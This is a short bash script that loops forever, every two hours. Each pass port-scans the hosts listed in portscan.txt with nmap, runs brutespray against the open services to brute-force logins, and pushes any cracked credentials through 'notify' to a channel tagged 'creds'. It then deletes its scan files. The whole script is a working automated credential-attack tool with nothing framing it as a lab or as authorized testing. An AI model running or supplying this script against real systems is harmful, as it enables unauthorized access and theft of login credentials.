#!/bin/bash

main() {

	nmap -iL portscan.txt --open -sC --top-ports 450 -oX nmap_out
	brutespray -f nmap_out.xml -P -q -o out -t 3 | grep SUCCESS | notify -id creds -bulk -d 2
	
	rm portscan.txt;rm nmap_out.xml
	
}

while true; do
    main
    sleep 7200
done
